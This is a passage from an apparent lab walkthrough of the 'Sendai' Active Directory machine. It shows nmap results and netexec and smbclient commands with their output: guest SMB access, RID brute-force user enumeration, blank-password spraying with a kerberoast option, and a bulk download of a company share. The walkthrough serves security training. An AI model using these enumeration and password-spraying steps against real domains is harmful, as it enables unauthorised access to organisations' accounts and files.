+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+53396/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+53397/tcp open  msrpc         Microsoft Windows RPC
+53412/tcp open  msrpc         Microsoft Windows RPC
+56185/tcp open  msrpc         Microsoft Windows RPC
+56207/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-06T16:01:24
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: -1s
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   11.90 ms 10.10.14.1
+2   11.91 ms 10.129.234.66
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 314.89 seconds</code></pre></div>
+<p>The domain name is <code class="inline-code">sendai.vl</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb 10.129.234.66                                       
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb 10.129.234.66 -u &apos;&apos; -p &apos;&apos;
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\:</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Sendai]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span>                                       
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span>   <span class="hljs-number">445</span>    DC               [*] Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:DC) (<span class="hljs-built_in">domain</span>:sendai.vl) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Sendai]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span> -u <span class="hljs-string">&apos;&apos;</span> -p <span class="hljs-string">&apos;&apos;</span>
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span>   <span class="hljs-number">445</span>    DC               [*] Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:DC) (<span class="hljs-built_in">domain</span>:sendai.vl) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.234</span><span class="hljs-number">.66</span>   <span class="hljs-number">445</span>    DC               [+] sendai.vl\:</code></pre></div>
+<p>The <code class="inline-code">guest</code> account is not disabled, so we can use it to enumerate the domain:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb 10.129.234.66 -u &apos;guest&apos; -p &apos;&apos; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config                          
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ            company share
+SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb 10.129.234.66 -u &apos;guest&apos; -p &apos;&apos; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config                          
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ            company share
+SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</code></pre></div>
+<p>Enumerating the domain for users returns</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u guest -p &apos;&apos; --rid-brute 10000 
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
+SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
+SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
+SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
+SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
+SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
+SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
+SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
+SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
+SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
+SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
+SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
+SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
+SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
+SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
+SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
+SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
+SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
+SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
+SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
+SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
+SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
+SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
+SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
+SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
+SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
+SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
+SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
+SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
+SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc smb sendai.vl -u guest -p &apos;&apos; --rid-brute 10000 
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\guest: 
+SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
+SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
+SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
+SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
+SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
+SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
+SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
+SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
+SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
+SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
+SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
+SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
+SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
+SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
+SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
+SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
+SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
+SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
+SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
+SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
+SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
+SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
+SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
+SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
+SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
+SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
+SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
+SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
+SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)</code></pre></div>
+<p>I notice a few users must change their password:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc ldap sendai.vl -u usernames.txt -p &apos;&apos; --kerberoast output.txt -d sendai.vl
+LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\sqlsvc: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\websvc: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Dorothy.Jones: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Kerry.Robinson: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Naomi.Gardner: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Anthony.Smith: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Susan.Harper: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Stephen.Simpson: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Marie.Gallagher: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Kathleen.Kelly: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Norman.Baxter: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Jason.Brady: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Malcolm.Smith: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Lisa.Williams: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Ross.Sullivan: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Clifford.Davey: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Declan.Jenkins: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Lawrence.Grant: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Leslie.Johnson: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Megan.Edwards: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ nxc ldap sendai.vl -u usernames.txt -p &apos;&apos; --kerberoast output.txt -d sendai.vl
+LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\sqlsvc: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\websvc: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Dorothy.Jones: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Kerry.Robinson: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Naomi.Gardner: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Anthony.Smith: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Susan.Harper: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Stephen.Simpson: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Marie.Gallagher: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Kathleen.Kelly: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Norman.Baxter: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Jason.Brady: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Malcolm.Smith: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Lisa.Williams: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Ross.Sullivan: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Clifford.Davey: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Declan.Jenkins: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Lawrence.Grant: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Leslie.Johnson: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Megan.Edwards: 
+LDAP        10.129.234.66   389    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE</code></pre></div>
+<p>Connecting to the <code class="inline-code">sendai</code> share returns the following:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ smbclient //sendai.vl/sendai        
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Jul 18 13:31:04 2023
+  ..                                DHS        0  Tue Apr 15 22:55:42 2025
+  hr                                  D        0  Tue Jul 11 08:58:19 2023
+  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023
+  it                                  D        0  Tue Jul 18 09:16:46 2023
+  legal                               D        0  Tue Jul 11 08:58:23 2023
+  security                            D        0  Tue Jul 18 09:17:35 2023
+  transfer                            D        0  Tue Jul 11 09:00:20 2023
+
+        7019007 blocks of size 4096. 853680 blocks available
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ smbclient //sendai.vl/sendai        
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 18 </span>13:31:04 2023
+  ..                                DHS       <span class="hljs-number"> 0 </span> Tue Apr<span class="hljs-number"> 15 </span>22:55:42 2025
+  hr                                  D       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 11 </span>08:58:19 2023
+  incident.txt                        A    <span class="hljs-number"> 1372 </span> Tue Jul<span class="hljs-number"> 18 </span>13:34:15 2023
+  it                                  D       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 18 </span>09:16:46 2023
+  legal                               D       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 11 </span>08:58:23 2023
+  security                            D       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 18 </span>09:17:35 2023
+  transfer                            D       <span class="hljs-number"> 0 </span> Tue Jul<span class="hljs-number"> 11 </span>09:00:20 2023
+
+       <span class="hljs-number"> 7019007 </span>blocks of size 4096.<span class="hljs-number"> 853680 </span>blocks available
+smb: \&gt; 
+</code></pre></div>
+<p>Download the available files inside the share:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">smb: \&gt; recurse on
+smb: \&gt; prompt off
+smb: \&gt; mget *
+getting file \incident.txt of size 1372 as incident.txt (28.5 KiloBytes/sec) (average 28.5 KiloBytes/sec)
+getting file \it\Bginfo64.exe of size 2774440 as it/Bginfo64.exe (2843.0 KiloBytes/sec) (average 2710.8 KiloBytes/sec)
+getting file \it\PsExec64.exe of size 833472 as it/PsExec64.exe (3405.6 KiloBytes/sec) (average 2844.8 KiloBytes/sec)
+getting file \security\guidelines.txt of size 4538 as security/guidelines.txt (47.7 KiloBytes/sec) (average 2649.5 KiloBytes/sec)
+smb: \&gt; 
+</pre><pre class="hljs"><code>smb: \&gt; recurse <span class="hljs-keyword">on</span>
+smb: \&gt; prompt off
+smb: \&gt; mget *
+getting <span class="hljs-built_in">file</span> \incident.txt <span class="hljs-keyword">of</span> size <span class="hljs-number">1372</span> <span class="hljs-keyword">as</span> incident.txt (<span class="hljs-number">28.5</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">28.5</span> KiloBytes/<span class="hljs-built_in">sec</span>)
+getting <span class="hljs-built_in">file</span> \<span class="hljs-keyword">it</span>\Bginfo64.exe <span class="hljs-keyword">of</span> size <span class="hljs-number">2774440</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">it</span>/Bginfo64.exe (<span class="hljs-number">2843.0</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">2710.8</span> KiloBytes/<span class="hljs-built_in">sec</span>)
+getting <span class="hljs-built_in">file</span> \<span class="hljs-keyword">it</span>\PsExec64.exe <span class="hljs-keyword">of</span> size <span class="hljs-number">833472</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">it</span>/PsExec64.exe (<span class="hljs-number">3405.6</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">2844.8</span> KiloBytes/<span class="hljs-built_in">sec</span>)
+getting <span class="hljs-built_in">file</span> \security\guidelines.txt <span class="hljs-keyword">of</span> size <span class="hljs-number">4538</span> <span class="hljs-keyword">as</span> security/guidelines.txt (<span class="hljs-number">47.7</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">2649.5</span> KiloBytes/<span class="hljs-built_in">sec</span>)
+smb: \&gt; 
+</code></pre></div>
+<p>When checking the <code class="inline-code">incident.txt</code>, I get the following output:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">Dear valued employees,
+
+We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.
+
+To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.
+
+We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.
+
+If you need assistance or have any questions regarding the password reset procedure, please don&apos;t hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.
+
+Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.</pre><pre class="hljs"><code>Dear valued employees,
+
+We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.
+
+To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.
+
+We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.
+
+If you need assistance or have any questions regarding the password reset procedure, please don&apos;t hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.
+
+Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.</code></pre></div>
+<p>This means the two users <code class="inline-code">Elliot.Yates</code> and <code class="inline-code">Thomas.Powell</code> are likely using weak passwords as their passwords have been expired.</p>
+<p>After further inspection, I notice both users are using blank password:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
